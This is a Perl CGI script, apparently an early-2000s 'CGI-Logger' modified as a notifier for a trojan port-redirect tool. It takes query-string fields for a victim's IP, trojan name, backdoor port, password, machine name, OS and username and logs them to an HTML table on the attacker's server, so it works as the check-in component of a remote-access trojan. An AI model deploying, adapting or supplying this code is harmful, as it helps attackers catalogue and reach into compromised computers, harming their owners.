#!/usr/bin/perl
print "Content-type:text/html\n\n";

#################################################################
#              				               	        #
#  Net-Devil CGI-LOGGER v.1.0  Written by:Nilez(nilez@mail.com) #
# ------------------------------------------------------------- #
#         Modified for use with EvilGoat port redirect          #
#                        CGI-Notifier                           #
#                       by: illwill                             #
#         www.illmob.org     xillwillx@yahoo.com                #
#                       10/01/02                                #
#################################################################

$in = $ENV{'QUERY_STRING'};
@in = split(/[&;]/,$in); 
foreach $i (0 .. $#in) {	
  $in[$i] =~ s/\+/ /g;	
  ($key, $val) = split(/=/,$in[$i],2);	
  $key =~ s/%([A-Fa-f0-9]{2})/pack("c",hex($1))/ge;	
  $val =~ s/%([A-Fa-f0-9]{2})/pack("c",hex($1))/ge;	
  $in{$key} .= "\0" if (defined($in{$key}));	 
  $in{$key} .= $val;
}
  $bestand='log.txt';
  $action = $in{'action'};
  $ip = $in{'ip'};
  $trojan = $in{'trojan'};
  $port = $in{'port'};
  $password = $in{'password'};
  $vicname = $in{'vicname'};
  $osvers = $in{'osvers'};
  $usrname = $in{'usrname'};


 @days   = ('Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday');
 ($sec,$min,$hour,$mday,$mon,$year,$wday) = (localtime(time))[0,1,2,3,4,5,6];
 $time = sprintf("%02d:%02d:%02d",$hour,$min,$sec);
 $date = "$days[$wday] $mday, $time";

if ($password eq "")
{
 $password = '-';
}

if($action eq "log")
{

open (FILE,"+<$bestand"); 
@list = <FILE>;
close(FILE);

while ($#list >= 149) { 
pop @list; 
} 

open (FILE,"+<$bestand");  
#print FILE "<tr><td><font color=#CCCCCC style=font-size:9 face=Verdana>".$ip."</td><td><font color=#CCCCCC style=font-size:9 face=Verdana>".$trojan."</td><td><font color=#CCCCCC style=font-size:9 face=Verdana>".$port."</td><td><font color=#CCCCCC style=font-size:9 face=Verdana>".$password."</td><td><font color=#CCCCCC style=font-size:9 face=Verdana>".$vicname."</td><td><font color=#CCCCCC style=font-size:9 face=Verdana>".$osvers."</td><td><font color=#CCCCCC style=font-size:9 face=Verdana>".$usrname."</td><td><font color=#CCCCCC style=font-size:9 face=Verdana>".$date."</td>\n"; 
print FILE "<tr><font color=#CCCCCC style=font-size:9 face=Verdana><td>$ENV{'REMOTE_ADDR'}</td><td>".$ip."</td><td>".$trojan."</td><td>".$port."</td><td>".$password."</td><td>".$vicname."</td><td>".$osvers."</td><td>".$usrname."</td><td>".$date."</td></font>\n"; 
print FILE (@list);
close(FILE);
}


